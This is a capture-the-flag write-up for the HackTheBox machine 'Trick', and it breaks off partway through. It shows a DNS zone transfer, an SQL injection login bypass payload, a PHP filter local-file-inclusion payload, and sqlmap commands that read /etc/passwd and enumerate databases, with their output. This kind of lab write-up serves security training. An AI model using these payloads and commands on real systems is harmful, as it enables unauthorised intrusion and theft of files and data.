### Trick HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.166

Nmap Scan:

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ nmap -sCV -A 10.10.11.166 -p22,25,53,80 -oN nmapscan                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 05:48 WAT
Nmap scan report for 10.10.11.166
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds
```

Heading over to the web server shows a static web page
![image](https://user-images.githubusercontent.com/113513376/217151573-f5bc970a-6468-48e7-bec2-0de94d305cc4.png)

Since there's dns i'll assume the domain name is trick.htb and do a dns zone transfer

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat /etc/hosts | grep .htb
10.10.11.166    trick.htb
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 608 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Tue Feb 07 05:54:37 WAT 2023
;; XFR size: 6 records (messages 1, bytes 231)
```

A new subdomain is found i'll add that to my `/etc/hosts` file 

On heading over to the new subdomain i got a login page
![image](https://user-images.githubusercontent.com/113513376/217152112-66ecad6e-17fb-4219-8629-01ae993fa119.png)

Bypassing it with basic sqli works and we get logged in
![image](https://user-images.githubusercontent.com/113513376/217152336-5051a77e-c4b6-4b17-a613-881a7fb3ac7c.png)

```
Payload: ' or 1=1 -- (both as username & password)
```

Noticing the url schema looks fishy. Its including the home page via a GET parameter(?page) so this is likely an LFI vulnerability

I tried including /etc/passwd manually but it failed
![image](https://user-images.githubusercontent.com/113513376/217152599-07376acf-c1b8-4319-92b9-9827065dee09.png)

But i can also try to dump the encoded form of the index.php file using php filter

And it worked
![image](https://user-images.githubusercontent.com/113513376/217152894-2e7f6906-dd2c-4b88-a02b-a4b6a623ea93.png)

```
Payload: http://preprod-payroll.trick.htb./index.php?page=php://filter/convert.base64-encode/resource=index
```

Now i'll decode the base64 encoded php code

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat index| base64  -d > index.php
```

Here's the decoded value for index.php
![image](https://user-images.githubusercontent.com/113513376/217156126-87334238-eb49-4a7c-b762-1bd6391a5883.png)
![image](https://user-images.githubusercontent.com/113513376/217156230-671d5a41-47cf-433a-97e5-e9ffd53476ba.png)

```
<?php
	session_start();
  if(!isset($_SESSION['login_id']))
    header('location:login.php');
 include('./header.php'); 
 // include('./auth.php'); 
 ?>
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
```

So basically the first php code sets the header location to login.php i then tried reading the content of login.php via the lfi which lead to reading db_connect.php
![image](https://user-images.githubusercontent.com/113513376/217156572-c0b66cda-3bf0-4116-b59d-a37fd3337d96.png)
![image](https://user-images.githubusercontent.com/113513376/217156600-a2d413ce-5db4-4c08-ac49-ffeefda87580.png)

We have db cred but no mysql open on the target and it doesn't work as ssh cred so it isn't very useful as of now

Back to the lfi, i wasn't able to include system files cause of this if i'm not mistaken this, `<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>` the value of $page is either obtained from the $_GET['page'] array, or it is set to "home" if $_GET['page'] is not set. The $_GET array is used to collect data passed from a URL's query string.

So we bypassed the login page using sqli how about dumping the tables using sqlmap ?

I'll intercept the login request on burp then save the request
![image](https://user-images.githubusercontent.com/113513376/217157577-fdfeb2ab-a5c4-478e-8145-450baba85182.png)
![image](https://user-images.githubusercontent.com/113513376/217157696-480477ea-0fc0-4506-ba73-4c3c4c2e0902.png)

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ nano request
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat request                
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 25
Origin: http://preprod-payroll.trick.htb.
Connection: close
Referer: http://preprod-payroll.trick.htb./login.php
Cookie: PHPSESSID=il4jvdgq6keotif0t0tqdu7ple

username=lol&password=lol
```

Now i'll run sqlmap on the request

After few minutes sql showed it was vulnerable to a time based attack and boolean based sqli 

So i had to re-run the sqlmap and used Boolean based sqli as a technique sqlmap should use so as to save time

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:49:58 /2023-02-07/

[06:49:58] [INFO] parsing HTTP request from 'request'
[06:49:58] [INFO] testing connection to the target URL
[06:49:59] [INFO] testing if the target URL content is stable
[06:50:00] [INFO] target URL content is stable
[06:50:00] [INFO] testing if POST parameter 'username' is dynamic
[06:50:01] [WARNING] POST parameter 'username' does not appear to be dynamic
[06:50:01] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[06:50:02] [INFO] testing for SQL injection on POST parameter 'username'
[06:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:51:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:51:10] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --not-string="21")
[06:51:23] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y
[06:51:23] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 155 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:51:38] [INFO] testing MySQL
[06:51:38] [INFO] confirming MySQL
[06:51:40] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[06:51:40] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 06:51:40 /2023-02-07/
```

Now we can do things like dump db and stuff but i like to check the privileges of a user 

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 --privileges
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:53:33 /2023-02-07/

[06:53:33] [INFO] parsing HTTP request from 'request'
[06:53:33] [INFO] resuming back-end DBMS 'mysql' 
[06:53:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:53:35] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:53:35] [INFO] fetching database users privileges
[06:53:35] [INFO] fetching database users
[06:53:35] [INFO] fetching number of database users
[06:53:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:53:35] [INFO] retrieved: 1
[06:53:38] [INFO] retrieved: 'remo'@'locaihost'
[06:54:42] [INFO] fetching number of privileges for user 'remo'
[06:54:42] [INFO] retrieved: 1
[06:54:44] [INFO] fetching privileges for user 'remo'
[06:54:44] [INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
    privilege: FILE

[06:55:02] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 06:55:02 /2023-02-07/
```

Cool the user has FILE privilege meaning he can read the local files lets test it to confirm

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 --file-read=/etc/passwd
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:57:27 /2023-02-07/

[06:57:27] [INFO] parsing HTTP request from 'request'
[06:57:27] [INFO] resuming back-end DBMS 'mysql' 
[06:57:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:57:28] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:57:28] [INFO] fingerprinting the back-end DBMS operating system
[06:57:29] [INFO] the back-end DBMS operating system is Linux
[06:57:29] [INFO] fetching file: '/etc/passwd'
[06:57:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:57:29] [INFO] retrieved: 726F6F743A783A303A303A726F6F743A2F726F6F743A2F60696E2F626173680A6461656DbF6E3A
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[07:00:22] [INFO] retrieved: 2351
[07:00:28] [INFO] the remote file '/etc/passwd' is larger (2351 B) than the local file '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd' (39B)
files saved to [1]:
[*] /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd (size differs from remote file)

[07:00:28] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 07:00:28 /2023-02-07/

└─$ cat /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Now i'm interested in the db present

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]                                                                                                                                                                  
└─$  sqlmap -r request --batch --technique B --level 5 --dbs                                                                                                                                                       
        ___                                                                                                                                                                                                        
       __H__                                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.7#stable}                                                                                                                                                                             
|_ -| . [,]     | .'| . |                                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
                                                                                                                                                                                                                   
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:59:29 /2023-02-07/

[06:59:29] [INFO] parsing HTTP request from 'request'
[06:59:30] [INFO] resuming back-end DBMS 'mysql' 
[06:59:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:59:32] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:59:32] [INFO] fetching database names
[06:59:32] [INFO] fetching number of databases
[06:59:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:59:32] [INFO] retrieved: 2
[06:59:35] [INFO] retrieved: information_schema
[07:00:22] [INFO] retrieved: @ayroll_db
available databases [2]:
[*] payroll_db
[*] information_schema

[07:01:00] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 07:01:00 /2023-02-07/


```

Since it probably has vhost, then it should be stored in the web server config file 

And this web server uses nginx
![image](https://user-images.githubusercontent.com/113513376/217161449-f9d8cea6-4854-4a88-a807-3c363dca7abb.png)

Now i can read the nginx conf file using the sqli vulnerability. By default its located in `/etc/nginx/sites-enabled/default`

```







